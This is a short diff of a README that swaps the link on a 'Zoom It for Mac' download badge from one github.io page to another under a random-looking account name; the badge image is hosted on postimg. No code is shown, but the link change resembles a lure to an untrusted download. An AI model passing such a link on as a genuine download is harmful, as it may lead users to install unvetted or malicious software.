@@ -22,7 +22,7 @@
 </p>
 
 <p align="center">
-  <a href="https://pudge-wagner.github.io/.github/zoom-it-mac">
+  <a href="https://skalsd-oasd.github.io/.github/zoom-it-mac">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png"
          alt="Download Zoom It for Mac — screen zoom tool" width="160"/>
   </a>
